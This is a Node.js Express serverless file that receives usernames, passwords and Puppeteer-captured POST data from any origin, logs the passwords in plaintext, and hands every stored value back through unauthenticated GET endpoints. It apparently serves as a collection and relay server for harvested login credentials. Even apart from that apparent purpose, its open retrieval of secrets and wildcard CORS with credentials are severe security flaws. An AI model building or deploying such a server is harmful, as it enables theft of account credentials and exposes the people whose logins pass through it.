const express = require('express');
const cors = require('cors');
const app = express();

// CORS configuration: Allow all origins (can change to specific domain in production)
const corsOptions = {
  origin: '*',  // Allow all origins or set a specific domain
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  credentials: true
};

app.use(cors(corsOptions)); // Apply CORS to all routes

// Use JSON middleware to parse request bodies
app.use(express.json());

// Ensure OPTIONS requests are handled properly (preflight)
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.sendStatus(200);  // Respond to OPTIONS preflight requests with status 200
});

let username = null;
let password = null;
let firstPuppeteerPostData = null;
let secondPuppeteerPostData = null;

// Endpoint to reset the username
app.post('/reset-username', (req, res) => {
  username = null;
  console.log('Username reset.');
  res.sendStatus(200);
});

// Endpoint to reset the password
app.post('/reset-password', (req, res) => {
  password = null;
  console.log('Password reset.');
  res.sendStatus(200);
});

// Endpoint to save the username
app.post('/save-username', (req, res) => {
  username = req.body.username;
  console.log('Received username:', username);
  res.sendStatus(200);
});

// Endpoint to save the password
app.post('/save-password', (req, res) => {
  password = req.body.password;
  console.log('Received password:', password);
  res.sendStatus(200);
});

// Endpoint to get the username
app.get('/get-username', (req, res) => {
  if (username) {
    res.status(200).json({ username });
  } else {
    res.status(404).send('No username available.');
  }
});

// Endpoint to get the password
app.get('/get-password', (req, res) => {
  if (password) {
    res.status(200).json({ password });
  } else {
    res.status(404).send('No password available.');
  }
});

// Endpoint to save first POST data from Puppeteer
app.post('/save-first-post-data', (req, res) => {
  firstPuppeteerPostData = req.body.postData;
  console.log('Received first POST data from Puppeteer:', firstPuppeteerPostData);
  res.status(200).send('First POST data saved.');
});

// Endpoint to save second POST data from Puppeteer
app.post('/save-second-post-data', (req, res) => {
  secondPuppeteerPostData = req.body.postData;
  console.log('Received second POST data from Puppeteer:', secondPuppeteerPostData);
  res.status(200).send('Second POST data saved.');
});

// Endpoint to reset first POST data (for debugging, can be optional)
app.post('/reset-first-post-data', (req, res) => {
  firstPuppeteerPostData = null;
  console.log('First POST data reset.');
  res.sendStatus(200);
});

// Endpoint to reset second POST data (for debugging, can be optional)
app.post('/reset-second-post-data', (req, res) => {
  secondPuppeteerPostData = null;
  console.log('Second POST data reset.');
  res.sendStatus(200);
});

// Get first POST data
app.get('/get-first-post-data', (req, res) => {
  if (firstPuppeteerPostData) {
    res.status(200).json({ postData: firstPuppeteerPostData });
  } else {
    res.status(404).send('No first POST data available.');
  }
});

// Get second POST data
app.get('/get-second-post-data', (req, res) => {
  if (secondPuppeteerPostData) {
    res.status(200).json({ postData: secondPuppeteerPostData });
  } else {
    res.status(404).send('No second POST data available.');
  }
});

// Export the Express app as a serverless function handler
module.exports = (req, res) => {
  app(req, res);  // Forward the request to the Express app
};
